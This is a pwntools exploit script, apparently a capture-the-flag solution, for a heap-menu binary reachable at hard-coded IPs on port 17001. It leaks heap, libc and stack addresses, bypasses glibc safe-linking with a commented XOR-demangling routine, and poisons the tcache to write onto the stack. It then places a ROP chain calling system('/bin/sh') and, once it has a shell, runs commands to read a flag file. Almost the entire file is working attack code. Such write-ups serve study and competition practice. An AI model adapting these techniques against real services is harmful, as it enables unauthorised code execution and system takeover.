from pwn import *
#context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './main'
HOST1 = '51.250.22.68'
HOST2 = '51.250.96.77'
PORT = 17001

LHOST = '172.17.0.2'
LPORT = 7777

#elf = ELF(TARGET)
def start():
	if args.R1:
		return remote(HOST1, PORT)
	elif args.R2:
		return remote(HOST2, PORT)
	elif args.LO:
		return remote(LHOST, LPORT)
	else:
		#return process(TARGET)
		#return process(['./ld-linux-x86-64.so.2', TARGET], env={"LD_PRELOAD":"./libc.so.6"})
		return process(['./ld-linux-x86-64.so.2', TARGET], env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
	debug(r, [0x1870])

def a(size, data):
	r.sendlineafter('> ', '1')
	r.sendlineafter(': ', str(size))
	if size != 0: 
		r.sendafter(': ', data)

def d(idx):
	r.sendlineafter('> ', '2')
	r.sendlineafter(': ', str(idx))

def v(idx):
	r.sendlineafter('> ', '3')
	r.sendlineafter(': ', str(idx))

## leak heap address
a(0x28, 'a'*0x28)#0
a(0x18, 'b'*0x18)#1
d(1)
d(0)
a(0x18, '\x00')#2
v(2)
leak = u64(r.recv(8))
dbg('leak')

'''
For Safe-Linking, We can restore heap address with just 1 leak.
- Let heap_base = 0x111222444000
- First free chunk->fd will be 0x000111222444 ( = (1st_free_chunk >> 12) )
- After first chunk, free chunk->fd will be 0x111333666XXX ( = (NEXT_free_chunk >> 12) ^ (PREV_free_chunk))
 Case 1. If we can get 1st value, just shift it.
 Case 2. If we get only after 1st value, we can still restore heap address with multiple xor.
  Let v0 = 0x111, v1 = 0x222, v2 = 0x444, 2nd_value = 0x111333666XXX
    0x111 = v0
    0x333 = 0x111 ^ 0x222 = v0 ^ v1
    0x666 = 0x333 ^ 0x444 = 0x111 ^ 0x222 ^ 0x444 = v0 ^ v1 ^ v2

  heap_base = (v0 << 36) | ((v0 ^ v1) << 24) | ((v0 ^ v1 ^ v2) << 12) = 0x111222444000
'''

def demangle(leak):
	v0 = 0xfff & (leak >> 36)
	v1 = 0xfff & (leak >> 24)
	v2 = 0xfff & (leak >> 12)
	return (v0 << 36) | ((v0^v1) << 24) |((v0^v1^v2) << 12) 

heap = demangle(leak)
dbg('heap')

## leak libc address
# create 0x420-sized fake chunk at heap+0x340
for i in range(8):
	a(0x60, flat(0, 0x421)+flat(0, 0x21) * 4 + flat(0, 0x51))#3-10
d(4)
d(5)
a(0x18, flat(0xbeef, 1, p64(heap+0x340)))#11
d(4)

# leak entire heap area to get libc
d(6)
d(7)
a(0x18, flat(0x348, 1, p64(heap)))#12
v(6)
leak = r.recv(0x348)
key = u64(leak[0x2c8:0x2d0])
leak = u64(leak[0x340:0x348])
dbg('leak')
base = leak - 0x219ce0
dbg('base')
environ = base + 0x221200
system = base + 0x50d60
dbg('key')

## leak stack address
d(8)
a(0x18, flat(0x8, 0xbeef, p64(environ)))#13
v(4)
leak = u64(r.recv(8))
dbg('leak')
stack = leak-0x128 # need to care about alignment
dbg('stack')

## edit tcache list to alloc stack address
# free 2 0x70-sized chunk
d(9)
d(10)

# chunk #9 is now pointing our fake chunk
a(0x18, flat(0x8, 0xdead, p64(heap+0x6f0)))#14
d(9)

# overwrite tcache free list of 0x70-sized chunk
a(0x48, flat(0xbeef, 0x21, (heap >> 12), 0xbeef, 0xbeef, 0x71, (stack)^(heap >> 12)))#15

# alloc 2 0x70-sized chunk
a(0x60, 'a')
rdi = base + 0x00171aef
binsh = base + 0x1d8698

# place our rop to stack
a(0x60, flat(rdi+1, rdi+1, rdi, binsh, system, 0xdeadbeef))#16

# return from main
context.log_level = 'debug'
r.sendlineafter('> ', '4')
r.sendline('cat flag.txt;pwd;id;ls -la;')
r.interactive()
